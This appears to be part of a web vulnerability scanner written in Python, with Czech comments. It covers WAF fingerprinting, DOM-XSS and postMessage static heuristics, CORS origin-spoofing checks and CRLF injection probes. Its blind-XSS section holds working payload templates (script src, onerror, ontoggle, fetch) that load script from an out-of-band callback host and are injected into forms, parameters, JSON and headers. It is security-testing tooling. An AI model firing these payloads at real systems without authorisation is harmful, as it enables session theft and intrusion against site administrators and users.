def _norm_headers(resp: requests.Response) -> Dict[str, str]:
    return {k.lower(): (v or "") for k, v in (resp.headers or {}).items()}
 
def _hdr_match(headers: Dict[str, str], token: str) -> bool:
    t = (token or "").lower()
    for k in headers.keys():
        if t.endswith("-"):
            if k.startswith(t):
                return True
        else:
            if k == t:
                return True
    return False
 
def fingerprint_waf(resp: requests.Response) -> Optional[Dict[str, str]]:
    if resp is None:
        return None
 
    headers = _norm_headers(resp)
    server_val = headers.get("server", "").lower()
    set_cookie = headers.get("set-cookie", "").lower()
    body = resp.text or ""
    status = resp.status_code

    # Rychlá detekce redirect-based WAF bloků
    # 307/302 na stejný nebo jiný host bez Location matching = WAF chování
    if status in (307, 302, 303):
        location = headers.get("location", "").lower()
        # Pokud redirect jde na /blocked, /denied, /security, /waf apod.
        waf_redirect_patterns = [
            "blocked", "denied", "security", "waf", "firewall",
            "access-denied", "forbidden", "threat", "policy",
        ]
        for pat in waf_redirect_patterns:
            if pat in location:
                return {
                    "name": "WAF (redirect-block)",
                    "confidence": 60,
                    "reason": f"307/302 redirect to {location[:60]}",
                }
        # NOTE: removed the "empty/root Location = silent WAF block" branch.
        # `Location: /` (redirect-to-home after POST, /old → /) is one of the
        # most common BENIGN redirect shapes on the web, so it produced a WAF
        # false positive on nearly every site with a trailing-slash or post-form
        # redirect. Genuine redirect-blocks go to /blocked, /denied, … and are
        # already caught by the keyword match above; a bare root redirect is not
        # a reliable WAF signal on its own.

    best: Optional[Dict[str, str]] = None
 
    for fp in WAF_FINGERPRINTS:
        score = 0
        reasons: List[str] = []
 
        for h in fp.get("headers", []):
            if _hdr_match(headers, h):
                score += 20
                reasons.append(f"hdr:{h}")
 
        for s in fp.get("server", []):
            if s.lower() in server_val:
                score += 20
                reasons.append(f"server:{s}")
 
        for c in fp.get("cookies", []):
            if c.lower() in set_cookie:
                score += 15
                reasons.append(f"cookie:{c}")
 
        for rx in fp.get("body_rx", []):
            try:
                if re.search(rx, body, flags=re.I):
                    score += 25
                    reasons.append(f"body:{rx}")
            except re.error:
                continue
 
        score = min(100, score + fp.get("weight", 0))
 
        if score >= 40:
            item = {
                "name": fp.get("name", "Unknown"),
                "confidence": score,
                "reason": ", ".join(reasons),
            }
            if best is None or item["confidence"] > best["confidence"]:
                best = item
 
    # ── Fallback heuristika: "tichý WAF" ─────────────────────────────────────
    # Některé WAFy (cloud proxy s custom rules, private Aricoma-style deny,
    # IP allowlist gateway) vrací jen status code + minimální body bez žádného
    # identifikačního headeru. Pokud jsme nic nenašli ale status je typický
    # pro block a body je krátký, flagujeme generic WAF block.
    if best is None and status in (403, 406, 429, 451, 501, 502, 503):
        body_len = len(body)
        # Typický WAF block má krátké body (<2KB) — plná error page má víc
        if body_len < 2048:
            # Ověř že to vypadá jako block a ne jako legitimní 404/500 page
            block_markers = [
                "blocked", "denied", "forbidden", "not allowed", "unauthorized",
                "access denied", "request blocked", "security", "firewall",
                "not in allowlist", "host not allowed", "rate limit",
            ]
            body_lower = body.lower()
            matched_markers = [m for m in block_markers if m in body_lower]
            if matched_markers or body_len < 100:
                # body_len < 100 → téměř prázdná odpověď = s velkou pravděpodobností WAF
                reason = f"status={status}, body={body_len}B"
                if matched_markers:
                    reason += f", markers={','.join(matched_markers[:2])}"
                best = {
                    "name": f"Generic WAF/Gateway (silent-block)",
                    "confidence": 50 if matched_markers else 40,
                    "reason": reason,
                }

    return best
 
# ── WAF baseline-diff ODSTRANĚN (v10.14) ─────────────────────────────────────
# Aktivní baseline-diff (posílal probe payloady) byl odstraněn — generoval
# šum, který shazoval scany. WAF se teď detekuje PASIVNĚ z crawler provozu
# (viz _passive_waf_scan v crawler smyčce) — žádné requesty navíc, vrací i
# název WAF ze signature slovníku.
 
# ── DOM-XSS Static Heuristics ----------
DOM_SOURCES = [
    r"location\.hash", r"location\.search", r"document\.URL", r"document\.documentURI",
    r"document\.referrer", r"window\.name", r"localStorage", r"sessionStorage",
    r"document\.cookie",
    # ── postMessage sources ──
    r"\.data\b",                          # event.data v message handleru
    r"e\.data\b", r"event\.data\b",       # explicitní event.data varianty
    r"MessageEvent",                      # přímá reference na MessageEvent typ
]
DOM_SINKS = [
    r"\.innerHTML\s*=", r"\.outerHTML\s*=", r"\.insertAdjacentHTML\s*\(",
    r"document\.write\s*\(", r"document\.writeln\s*\(",
    r"eval\s*\(", r"setTimeout\s*\(\s*['\"]", r"setInterval\s*\(\s*['\"]",
    r"Function\s*\(",
    # ── jQuery sinks ──
    r"\$\s*\(", r"\.html\s*\(",           # $(tainted) a .html(tainted)
    r"\.append\s*\(", r"\.prepend\s*\(",  # jQuery DOM insertion
]
DOM_LINK_RX = re.compile(
    rf"({'|'.join(DOM_SOURCES)}).*?({'|'.join(DOM_SINKS)})|({'|'.join(DOM_SINKS)}).*?({'|'.join(DOM_SOURCES)})",
    flags=re.I | re.S
)
SCRIPT_URL_IGNORE = ("data:", "mailto:", "tel:", "javascript:")
 
def extract_scripts(html: str, base_url: str) -> List[Tuple[str, str]]:
    soup = BeautifulSoup(html or "", "html.parser")
    scripts = []
    for i, tag in enumerate(soup.find_all("script", src=False)):
        code = tag.string or tag.text or ""
        if code and code.strip():
            scripts.append((f"inline#{i}", code))
    for tag in soup.find_all("script", src=True):
        src = tag.get("src", "").strip()
        if not src or src.startswith(SCRIPT_URL_IGNORE):
            continue
        if not src.startswith(("http://", "https://")):
            src = requests.compat.urljoin(base_url, src)
        scripts.append((src, None))
    return scripts
 
def fetch_external_script(session: requests.Session, url: str, timeout: float) -> Optional[str]:
    try:
        r = session.get(url, timeout=timeout)
        if r.status_code < 400:
            return r.text or ""
    except Exception:
        # v10.27: catch-all — externí <script src> z cíle může mířit na mrtvý
        # host (curl_cffi CurlError NENÍ requests.RequestException). Best-effort
        # audit: nedosažitelný skript prostě přeskoč, nikdy neshazuj/neloguj ERROR.
        return None
    return None
 
def static_dom_xss_scan(session: requests.Session, html: str, base_url: str, timeout: float) -> List[Dict[str, str]]:
    """
    Statická DOM-XSS analýza — hledá nebezpečné source/sink vzory v inline JS
    a externích skriptech.

    Optimalizace proti bloatu reportu:
    - Přeskoč velké knihovny (jQuery, Bootstrap, React apod.) — false positives
    - Snippet omezen na ±120 znaků kolem matche (ne celý soubor)
    - Pokud žádný DOM sink match, skript se nepřidá do findings
    """
    findings = []
    scripts = extract_scripts(html, base_url)

    # Signatury známých knihoven — jejich DOM XSS findings jsou vždy FP
    LIB_SIGNATURES = (
        "jQuery v", "jquery.org/license", "jquery.min",
        "Bootstrap v", "getbootstrap.com",
        "React v", "MIT license for React",
        "lodash", "underscore.js",
        "moment.js", "moment.min.js",
        "AngularJS v", "angular.js", "angular.min.js",
        "Vue.js v", "vuejs.org",
        "Popper.js", "popper.js v",
        "Chart.js", "chartjs.org",
        "Leaflet", "leafletjs.com",
        "D3.js", "d3js.org",
        "Three.js", "threejs.org",
        "PIXI.js", "pixijs.com",
        "GSAP", "greensock.com",
    )
    MAX_LIB_SIZE = 50_000  # knihovny bývají > 50 KB

    for origin, content in scripts:
        code = content
        if code is None:
            code = fetch_external_script(session, origin, timeout)
        if not code:
            continue

        # Skip knihoven: velké skripty s knihovní signaturou v hlavičce
        if len(code) > MAX_LIB_SIZE:
            header = code[:800]
            if any(sig in header for sig in LIB_SIGNATURES):
                logging.debug(f"[DOM-STATIC] Skipping library: {origin}")
                continue

        snippet_window = code[:20000]
        m = DOM_LINK_RX.search(snippet_window)
        if m:
            s = m.start(); e = m.end()
            ctx = snippet_window[max(0, s-120): min(len(snippet_window), e+120)]
            findings.append({"where": origin, "snippet": ctx})
    return findings

# ══════════════════════════════════════════════════════════════════════════════
# ── BLIND XSS (Out-of-Band callback) ────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════
#
# Blind XSS se projeví až když admin/interní uživatel zobrazí injektovaná data
# (tickety, logy, dashboardy). Standardní reflected scan to nikdy nevidí.
#
# Princip:
#   1. Vygeneruj unikátní marker ID pro každý injection point
#   2. Payload načte JS z callback URL: <script src=https://oob.server/x/MARKER>
#   3. Callback server zaznamená request = potvrzení XSS
#   4. Scanner injektuje do všech dostupných vstupů (GET, POST, JSON, headers)
#
# Uživatel musí poskytnout --blind-oob-url (vlastní callback endpoint).
# Podporované servery: XSSHunter, Burp Collaborator, interakt, vlastní.
# ══════════════════════════════════════════════════════════════════════════════

BLIND_XSS_PAYLOAD_TEMPLATES = [
    # Script src — nejspolehlivější, funguje i s CSP pokud CDN whitelisted
    '<script src="{oob_url}/{marker}"></script>',
    # Img onerror — fallback pokud <script> je filtrován
    '<img src=x onerror="var s=document.createElement(\'script\');s.src=\'{oob_url}/{marker}\';document.body.appendChild(s)">',
    # SVG onload
    '<svg onload="var s=document.createElement(\'script\');s.src=\'{oob_url}/{marker}\';document.body.appendChild(s)">',
    # Body onload (pokud se data zobrazí v HTML body kontextu)
    '"><body onload="var s=document.createElement(\'script\');s.src=\'{oob_url}/{marker}\';document.body.appendChild(s)">',
    # Input autofocus onfocus — spustí se bez interakce
    '" autofocus onfocus="var s=document.createElement(\'script\');s.src=\'{oob_url}/{marker}\';document.body.appendChild(s)" x="',
    # Details/summary — spustí se na Chrome automaticky
    '<details open ontoggle="var s=document.createElement(\'script\');s.src=\'{oob_url}/{marker}\';document.body.appendChild(s)">',
    # Iframe srcdoc — bypass některých sanitizerů
    '<iframe srcdoc="<script src={oob_url}/{marker}></script>">',
    # Link stylesheet — funguje i kde <script> neprochází, exfiltruje přes CSS
    '<link rel=stylesheet href="{oob_url}/{marker}">',
    # Object data — alternativa k iframe
    '<object data="{oob_url}/{marker}">',
    # Embed src
    '<embed src="{oob_url}/{marker}">',
]

# Blind XSS payloady pro hlavičky — kratší, cílenější
BLIND_XSS_HEADER_TEMPLATES = [
    '<script src="{oob_url}/{marker}"></script>',
    '"><img src=x onerror="fetch(\'{oob_url}/{marker}\')">',
]

# Blind XSS payloady pro JSON body
BLIND_XSS_JSON_TEMPLATES = [
    '<script src="{oob_url}/{marker}"></script>',
    '<img src=x onerror="fetch(\'{oob_url}/{marker}\')">',
]


def generate_blind_payloads(oob_url: str, marker_prefix: str,
                            templates: List[str] = None) -> List[Tuple[str, str]]:
    """
    Vygeneruje blind XSS payloady s unikátním marker ID.

    Vrací: [(payload, marker_id), ...]
    Marker ID = {prefix}_{random} — prefix identifikuje injection point.
    """
    templates = templates or BLIND_XSS_PAYLOAD_TEMPLATES
    # Normalize OOB URL — strip trailing slash
    oob = oob_url.rstrip("/")
    out: List[Tuple[str, str]] = []
    for tmpl in templates:
        marker = f"{marker_prefix}_{random_marker(8)}"
        payload = tmpl.format(oob_url=oob, marker=marker)
        out.append((payload, marker))
    return out


def inject_blind_xss(session: requests.Session,
                     url: str,
                     html: str,
                     oob_url: str,
                     timeout: float,
                     follow_redirects: bool,
                     sleep_between: float = 0.02,
                     cb: Dict[str, Callable] = None) -> List[Dict]:
    """
    Injektuje blind XSS payloady do všech dostupných vstupů na stránce.

    Vstupy:
    - GET parametry (z URL)
    - POST formuláře (hidden + injectable pole)
    - JSON API (common keys)
    - HTTP hlavičky (Referer, X-Forwarded-For, User-Agent, ...)

    Vrací seznam injection záznamů:
        [{"url": str, "param": str, "method": str, "marker": str,
          "payload": str, "status": int}, ...]

    Tyto záznamy se ukládají do reportu — uživatel pak na callback serveru
    ověří, zda se některý marker ozval (= blind XSS potvrzena).
    """
    if not cb:
        cb = {"on_log": _noop}
    injected: List[Dict] = []

    # ── GET parametry ─────────────────────────────────────────────────────────
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    for param in qs.keys():
        blind_payloads = generate_blind_payloads(oob_url, f"GET_{param[:10]}")
        for payload, marker in blind_payloads[:3]:  # max 3 na param (šetří bandwidth)
            test_url = inject_into_params(url, param, payload)
            if not test_url:
                continue
            try:
                r = session.get(test_url, timeout=timeout, allow_redirects=follow_redirects)
                injected.append({
                    "url": test_url, "param": param, "method": "GET",
                    "marker": marker, "payload": payload,
                    "status": r.status_code,
                })
            except _NET_EXCEPTIONS:
                continue
            if sleep_between > 0:
                time.sleep(sleep_between)

    # ── POST formuláře ────────────────────────────────────────────────────────
    soup = BeautifulSoup(html or "", "html.parser")
    for form in soup.find_all("form"):
        if (form.get("method") or "get").lower() != "post":
            continue
        action = requests.compat.urljoin(url, form.get("action") or url)
        if urlparse(action).scheme not in ("http", "https"):
            continue

        base_data: Dict[str, str] = {}
        injectable: List[str] = []
        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name")
            if not name:
                continue
            typ = (inp.get("type") or "text").lower()
            if typ in ("hidden", "submit", "button", "image", "reset", "file"):
                base_data[name] = inp.get("value") or ""
            else:
                injectable.append(name)

        for fld in injectable:
            blind_payloads = generate_blind_payloads(oob_url, f"POST_{fld[:10]}")
            for payload, marker in blind_payloads[:2]:  # 2 na pole
                data = {**base_data, **{f: ("" if f != fld else payload) for f in injectable}}
                try:
                    r = session.post(action, data=data, timeout=timeout,
                                     allow_redirects=follow_redirects)
                    injected.append({
                        "url": action, "param": fld, "method": "POST",
                        "marker": marker, "payload": payload,
                        "status": r.status_code,
                    })
                except _NET_EXCEPTIONS:
                    continue
                if sleep_between > 0:
                    time.sleep(sleep_between)

    # ── JSON API ──────────────────────────────────────────────────────────────
    json_headers = {"Content-Type": "application/json", "Accept": "application/json, text/html, */*"}
    base_url_clean = urlunparse(urlparse(url)._replace(query="", fragment=""))
    for key in JSON_COMMON_KEYS[:8]:  # top 8 klíčů
        blind_payloads = generate_blind_payloads(oob_url, f"JSON_{key[:10]}",
                                                  templates=BLIND_XSS_JSON_TEMPLATES)
        for payload, marker in blind_payloads[:1]:  # 1 na klíč
            try:
                r = session.post(base_url_clean, json={key: payload},
                                 headers=json_headers, timeout=timeout,
                                 allow_redirects=follow_redirects)
                injected.append({
                    "url": base_url_clean, "param": f"json:{key}", "method": "JSON",
                    "marker": marker, "payload": payload,
                    "status": r.status_code,
                })
            except _NET_EXCEPTIONS:
                continue
            if sleep_between > 0:
                time.sleep(sleep_between)

    # ── HTTP hlavičky ─────────────────────────────────────────────────────────
    for header in INJECTABLE_HEADERS:
        blind_payloads = generate_blind_payloads(oob_url, f"HDR_{header[:10]}",
                                                  templates=BLIND_XSS_HEADER_TEMPLATES)
        for payload, marker in blind_payloads[:1]:
            header_safe = payload.encode("latin-1", errors="replace").decode("latin-1")
            try:
                r = session.get(url, headers={header: header_safe}, timeout=timeout,
                                allow_redirects=follow_redirects)
                injected.append({
                    "url": url, "param": f"header:{header}", "method": "HEADER",
                    "marker": marker, "payload": payload,
                    "status": r.status_code,
                })
            except _NET_EXCEPTIONS:
                continue
            if sleep_between > 0:
                time.sleep(sleep_between)

    return injected


# ══════════════════════════════════════════════════════════════════════════════
# ── postMessage XSS SCANNER ────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════
#
# postMessage je meziiframe/okno komunikační mechanismus. Pokud listener
# nezvaliduje origin a data strčí do innerHTML/eval, je to DOM XSS.
#
# Statická analýza: hledej addEventListener("message", ...) + sink v handleru.
# Dynamická analýza (Playwright): otevři stránku, pošli postMessage s payloadem,
# sleduj DOM mutace a JS chyby.
# ══════════════════════════════════════════════════════════════════════════════

# Regex pro detekci postMessage listenerů v JS kódu
_POSTMESSAGE_LISTENER_RX = re.compile(
    r"""
    (?:window|self|document|globalThis|top|parent)   # receiver object
    \s*\.\s*
    (?:
        # Varianta 1: addEventListener("message", handler)
        addEventListener\s*\(\s*
        (['"])message\1
        \s*,\s*
        (?:function\s*\([^)]*\)|                  # function(event) {
           \([^)]*\)\s*=>|                        # (event) => {
           [a-zA-Z_$][\w$]*                        # pojmenovaný handler
        )
        |
        # Varianta 2 (v10.14 fix): přímé přiřazení .onmessage =
        # Tohle je alf.nu vzor: window.onmessage = function(a){...}
        # Bez tohoto rozšíření postMessage scanner mine každý handler
        # registrovaný přímým přiřazením, ne přes addEventListener.
        onmessage\s*=\s*
        (?:function\s*\([^)]*\)|                  # = function(a) {
           async\s+function\s*\([^)]*\)|          # = async function(a) {
           \([^)]*\)\s*=>|                        # = (a) => {
           [a-zA-Z_$][\w$]*                        # = pojmenovaná fn
        )
    )
    """,
    re.VERBOSE | re.I
)

# Sink patterns uvnitř message handleru
_POSTMESSAGE_SINK_RX = re.compile(
    r"""
    \.innerHTML\s*=|
    \.outerHTML\s*=|
    \.insertAdjacentHTML\s*\(|
    document\.write\s*\(|
    eval\s*\(|
    setTimeout\s*\(|
    setInterval\s*\(|
    Function\s*\(|
    \$\s*\(|                          # jQuery $(data)
    \.html\s*\(|                      # jQuery .html(data)
    \.append\s*\(|                    # jQuery .append(data)
    location\s*(?:\.href)?\s*=|       # redirect sink
    window\.open\s*\(                 # open redirect / XSS
    """,
    re.VERBOSE | re.I
)

# Kontrola zda handler ověřuje origin
_ORIGIN_CHECK_RX = re.compile(
    r"""
    (?:event|e|evt|msg)               # event objekt
    \s*\.\s*origin\s*                 # .origin
    (?:===?\s*|!==?\s*|\.includes\(|\.startsWith\(|\.match\(|\.indexOf\()
    """,
    re.VERBOSE | re.I
)


# ─── v10.14: CORS misconfiguration detection ────────────────────────────────
# Non-destructive — jen GET requesty s vlastním Origin headerem, kontroluje
# response Access-Control-* headery. Žádný state change na serveru.
#
# Testované varianty:
#   1. Plně evil origin (https://evil.example.com)
#   2. null origin (Origin: null) — useful pro sandboxed iframes attack
#   3. Suffix bypass — target.com.evil.com (server matchuje "target.com")
#   4. Prefix bypass — eviltarget.com (server matchuje "target")
#
# Severity:
#   - CRITICAL: ACAO reflectuje + ACAC=true → account takeover přes XHR
#   - HIGH: ACAO reflectuje (bez credentials) → data exfil
#   - MEDIUM: ACAO=null s ACAC=true → sandboxed iframe attack
def cors_scan(session: requests.Session,
              url: str,
              timeout: float = 8.0,
              on_log: Optional[Callable] = None) -> List[Dict]:
    """Test CORS misconfiguration na zadaném URL.

    Vrátí seznam findings (dict) — každý popisuje konkrétní bypass nebo
    misconfig. Prázdný list = OK / bezpečně nakonfigurováno.
    """
    findings: List[Dict] = []

    try:
        parsed = urlparse(url)
    except Exception:
        return findings

    if not parsed.netloc:
        return findings

    target_host = parsed.netloc
    # Strip port
    target_domain = target_host.split(":")[0]

    # v10.14: Extract registrable base domain (TLD+1) — pro test variants
    # cílící base domain match. Příklad: api.example.com → example.com,
    # 127.0.0.1 → 127.0.0.1 (no change), localhost → localhost.
    # Heuristika: poslední 2 části hostname pokud má dots, jinak whole.
    def _extract_registrable(host: str) -> str:
        if not host or "." not in host:
            return host
        # IP address (no registrable concept)
        try:
            import ipaddress
            ipaddress.ip_address(host)
            return host
        except (ValueError, ImportError):
            pass
        parts = host.split(".")
        if len(parts) >= 2:
            return ".".join(parts[-2:])
        return host

    base_domain = _extract_registrable(target_domain)
    # Pokud base_domain == target_domain, nepřidávat duplicitní varianty
    test_base = (base_domain != target_domain)

    # Test variants — (origin_to_send, attack_type, description)
    test_origins = [
        ("https://evil.example.com", "reflection",
         "Arbitrary origin reflection"),
        ("null", "null_origin",
         "null origin accepted (sandboxed iframe attack vector)"),
        (f"https://{target_domain}.evil.example.com", "suffix_bypass",
         "Suffix bypass — server matches substring"),
        (f"https://evil{target_domain}", "prefix_bypass",
         "Prefix bypass — server matches substring"),
        # Trailing dot bypass — RFC ambiguous, some servers strip the dot
        (f"https://{target_domain}.", "trailing_dot",
         "Trailing dot bypass — RFC parsing inconsistency"),
        # Underscore bypass — invalid in hostname but accepted by some
        (f"https://{target_domain}_evil.example.com", "underscore_bypass",
         "Underscore bypass — non-standard hostname"),
    ]

    # v10.14: Pokud target má base domain (e.g. api.example.com),
    # přidat varianty cílící base. Mnohé servery matchnou base
    # domain místo full hostname — toto je nejčastější bypass v reálu.
    if test_base:
        test_origins.extend([
            (f"https://{base_domain}.evil.example.com", "base_suffix_bypass",
             f"Base-domain suffix bypass — server matches '{base_domain}'"),
            (f"https://evil-{base_domain}", "base_prefix_bypass",
             f"Base-domain prefix bypass — server matches '{base_domain}'"),
            (f"https://attacker-{base_domain}.com", "base_substring_bypass",
             f"Base-domain substring bypass — server matches "
             f"'{base_domain}' substring"),
        ])

    # v10.14: Substring bypass — origin contains target as substring
    # ale není to ani prefix ani suffix. Catches sloppy "in" checks.
    test_origins.append((
        f"https://attacker.{target_domain}.evil.example.com",
        "embedded_substring",
        f"Embedded substring bypass — '{target_domain}' uvnitř evil origin",
    ))

    for evil_origin, attack_type, description in test_origins:
        try:
            # Custom session-level header override jen pro tento request
            extra_headers = {"Origin": evil_origin}
            r = session.get(url, headers=extra_headers, timeout=timeout,
                            allow_redirects=False)
        except _NET_EXCEPTIONS:
            continue

        if r is None:
            continue

        # Kontroluj ACAO + ACAC headery (case-insensitive)
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get(
            "Access-Control-Allow-Credentials", "").lower()
        # v10.14: Vary header check — Vary: Origin signalizuje, že server
        # cachuje per-origin. Pokud chybí ALE server reflectuje origin,
        # je to silný signál misconfig (cache může vrátit attacker's
        # response všem uživatelům).
        vary = (r.headers.get("Vary", "") or "").lower()
        vary_has_origin = "origin" in vary
        # Normalizace whitespace
        acao_norm = acao.strip().rstrip("/")
        evil_norm = evil_origin.rstrip("/")

        # Detection logic
        is_reflected = False
        is_wildcard = (acao_norm == "*")
        is_null_accepted = (
            acao_norm.lower() == "null" and evil_origin == "null")

        if acao_norm == evil_norm:
            is_reflected = True
        elif (acao_norm.lower() == "null" and acao_norm == evil_norm):
            is_reflected = True

        # Žádný finding pokud server správně odmítne (no ACAO, nebo jiná hodnota)
        if not (is_reflected or is_null_accepted or
                (is_wildcard and acac == "true")):
            continue

        # Závažnost závisí na kombinaci
        severity = "medium"
        _cors_fp_risk = False        # v10.25: default; is_reflected-no-cred zvedne
        _cors_fp_reason = None
        cwe_label = "CWE-942"  # Permissive Cross-domain Policy

        if is_wildcard and acac == "true":
            # Toto by browser sám odmítl (ACAO=* + credentials je invalid)
            # — ale signalizuje misconfig
            severity = "high"
            description = (
                "ACAO=* combined with ACAC=true (browser will reject "
                "but signals server-side misconfig)")
        elif is_reflected and acac == "true":
            # Nejhorší případ — útočník může číst response s credentials
            severity = "critical"
            description = (
                f"{description} — ACAO reflects '{evil_origin}' AND "
                f"ACAC=true → account takeover via XHR")
        elif is_reflected:
            # v10.25 FP gate: reflexe originu BEZ credentials NENÍ high.
            # Browser nepřipojí credentials → útočník čte jen data, která
            # server vydá neautentizovanému cross-origin requestu (obvykle
            # veřejná). Dřív se to hlásilo jako HIGH = nadhodnocení / FP.
            # Nově low + fp_risk: impact závisí na tom, zda endpoint vrací
            # citlivá data (to scanner neví) → ruční ověření.
            severity = "low"
            _cors_fp_risk = True
            _cors_fp_reason = (
                "ACAO reflects arbitrary origin but WITHOUT "
                "Access-Control-Allow-Credentials=true — browser sends no "
                "credentials, so impact is limited to data the server already "
                "serves to unauthenticated cross-origin requests. Verify the "
                "endpoint returns sensitive data before treating as exploitable.")
            description = (
                f"{description} — ACAO reflects '{evil_origin}' "
                f"(no credentials; impact limited to unauthenticated "
                f"cross-origin reads — verify sensitivity)")
        elif is_null_accepted and acac == "true":
            # null origin + credentials = sandboxed iframe exploit
            severity = "high"
            description = (
                "null origin accepted with credentials — exploitable "
                "via sandboxed iframe (<iframe sandbox srcdoc=...>)")

        finding = {
            "kind": "cors",
            "url": url,
            "attack_type": attack_type,
            "evil_origin": evil_origin,
            "response_acao": acao,
            "response_acac": acac,
            "fp_risk": _cors_fp_risk,          # v10.25
            "fp_reason": _cors_fp_reason,
            "vary_includes_origin": vary_has_origin,  # v10.14
            "severity": severity,
            "cwe": cwe_label,
            "description": description,
        }
        findings.append(finding)

        if on_log:
            try:
                on_log(
                    f"[CORS] {url} — {severity.upper()}: {attack_type} "
                    f"(origin={evil_origin}, ACAO={acao}, ACAC={acac})",
                    "warning" if severity in ("high", "critical") else "info",
                )
            except Exception:
                pass

    return findings




# ─── v10.14: CRLF injection detection ──────────────────────────────────────
# Non-destructive — pošle URL params s %0d%0a markerem, kontroluje, jestli
# se objevily v response headers nebo body. Žádný persistent state.
#
# Severity:
#   - CRITICAL: Cookie / Location / CSP injection (session/redirect/script
#     execution)
#   - HIGH: Arbitrary header injection → response splitting
#   - MEDIUM: Body reflection po CRLF — verify pro exploit

# Marker pro identifikaci — unikátní string co se objeví v
# headeru/body pokud injection prošla
_CRLF_INJECTED_MARKER = "XSGS-CRLF-Injected"
# v10.15: název hlavičky, kterou payloady injektují. Detekce true-positive
# musí ověřit, že se v response objevila NOVÁ hlavička přesně tohoto jména
# (= HTTP parser interpretoval CR/LF jako oddělovač hlaviček). Musí přesně
# odpovídat názvu v _CRLF_PAYLOADS níže.
_CRLF_INJECTED_HEADER = "X-Custom-Header"

# Payload variants
_CRLF_PAYLOADS = [
    # URL-encoded CRLF (nejčastější — server decoduje params)
    f"%0d%0aX-Custom-Header:%20{_CRLF_INJECTED_MARKER}",
    # Double-encoded (servers s double URL decode)
    f"%250d%250aX-Custom-Header:%20{_CRLF_INJECTED_MARKER}",
    # Unicode CRLF (bypass — některé filtrují jen ASCII \r\n)
    f"%u000d%u000aX-Custom-Header:%20{_CRLF_INJECTED_MARKER}",
    # Just LF (servery akceptují bare LF jako separator per HTTP/0.9)
    f"%0aX-Custom-Header:%20{_CRLF_INJECTED_MARKER}",
    # CR only (legacy)
    f"%0dX-Custom-Header:%20{_CRLF_INJECTED_MARKER}",
    # Set-Cookie injection (vyšší impact než custom header)
    f"%0d%0aSet-Cookie:%20xsgs_pwn=1",
]


def crlf_scan(session: requests.Session,
              url: str,
              timeout: float = 8.0,
              on_log: Optional[Callable] = None) -> List[Dict]:
    """Test CRLF injection na URL parametrech.

    Pro každý parametr v query string posílá payload variants
    a kontroluje response headers a body na náš marker. Pokud žádné
    parametry, přidá dummy parametr.

    Vrátí seznam findings (může být prázdný = OK).
    """
    findings: List[Dict] = []

    try:
        parsed = urlparse(url)
    except Exception:
        return findings

    from urllib.parse import parse_qsl, urlencode

    query_params = parse_qsl(parsed.query, keep_blank_values=True)
    # Pokud žádné parametry, přidej dummy 'q'
    if not query_params:
        query_params = [("q", "test")]

    # Pro každý parametr otestuj všechny CRLF payloads
    for param_name, original_value in query_params:
        param_findings_for_this: List[Dict] = []
        for payload in _CRLF_PAYLOADS:
            # Připrav modifikovaný URL s injected payload
            test_params = []
            for pn, pv in query_params:
                if pn == param_name:
                    test_params.append((pn, original_value + payload))
                else:
                    test_params.append((pn, pv))
            try:
                # safe="" abychom zachovali %XX kódování
                modified_query = "&".join(
                    f"{k}={v}" for k, v in test_params
                )
                modified_parsed = parsed._replace(query=modified_query)
                test_url = modified_parsed.geturl()
            except Exception:
                continue

            try:
                r = session.get(test_url, timeout=timeout,
                                allow_redirects=False)
            except _NET_EXCEPTIONS:
                continue

            if r is None:
                continue

            # Detection
            # v10.15 FP-fix: dřív se hit počítal, když se marker objevil
            # KDEKOLIV v hlavičkách (i v hodnotě existující hlavičky, kam
            # server jen zreflektoval URL-dekódovaný parametr) → falešně
            # hlásilo "server created new header". TRUE positive je jen
            # tehdy, když HTTP parser uviděl NOVOU hlavičku přesně toho
            # jména, které injektujeme (_CRLF_INJECTED_HEADER) → CR/LF byly
            # interpretovány jako oddělovač. Reflexe do jiné hlavičky se už
            # nepočítá.
            header_hit = False
            header_hit_name = ""
            _inj_hdr_lower = _CRLF_INJECTED_HEADER.lower()
            for hname, hvalue in r.headers.items():
                if (hname.lower() == _inj_hdr_lower
                        and _CRLF_INJECTED_MARKER in hvalue):
                    header_hit = True
                    header_hit_name = hname
                    break
                # Set-Cookie split (payload injektuje Set-Cookie: xsgs_pwn=1)
                if hname.lower() == "set-cookie" and "xsgs_pwn=1" in hvalue:
                    header_hit = True
                    header_hit_name = "Set-Cookie"
                    break

            body_hit = False
            body_hit_with_raw_crlf = False
            try:
                body_text = r.text[:200000]  # cap 200KB
                if _CRLF_INJECTED_MARKER in body_text:
                    body_hit = True
                    # v10.15 FP-fix: dřív stačil JAKÝKOLIV \n v 80 bytech
                    # před markerem → jenže HTML je newliny prošpikované,
                    # takže to fíralo na každé pouhé zreflektování markeru
                    # do body (medium severity). Teď vyžadujeme doslova
                    # injektovanou strukturu "\r\nX-Custom-Header" /
                    # "\nX-Custom-Header" těsně před markerem — to dokazuje,
                    # že server URL-dekódoval %0d%0a na reálné CR/LF a vypsal
                    # naši injektovanou hlavičkovou řádku do body. Obyčejné
                    # HTML newliny už nestačí.
                    raw = getattr(r, "content", b"") or b""
                    marker_bytes = _CRLF_INJECTED_MARKER.encode("utf-8")
                    hdr_bytes = _CRLF_INJECTED_HEADER.encode("utf-8")
                    idx = raw.find(marker_bytes)
                    if idx > 0:
                        ctx_start = max(0, idx - 120)
                        context_before = raw[ctx_start:idx]
                        if (b"\r\n" + hdr_bytes in context_before
                                or b"\n" + hdr_bytes in context_before):
                            body_hit_with_raw_crlf = True
            except Exception:
                pass

            # v10.15 FP-fix: emituj JEN při prokázaném true-positive —
            # reálný header split, nebo reálný CR/LF + injektovaná struktura
            # v body. Pouhá reflexe markeru (body_hit bez raw_crlf) se už
            # NEhlásí jako CRLF — je to jen reflexe, kterou pokrývají jiné
            # fáze (seed/fuzz), a hlásit ji jako "low CRLF" byl jen šum.
            if not (header_hit or body_hit_with_raw_crlf):
                continue

            # Severity
            severity = "medium"
            if header_hit:
                hname_lower = header_hit_name.lower()
                if hname_lower in (
                        "set-cookie", "location", "x-xss-protection",
                        "content-security-policy", "x-frame-options",
                        "strict-transport-security"):
                    severity = "critical"
                else:
                    severity = "high"
                description = (
                    f"CRLF injection: server created a new header "
                    f"'{header_hit_name}' from parameter '{param_name}'. "
                    f"Server does not sanitize CR/LF characters."
                )
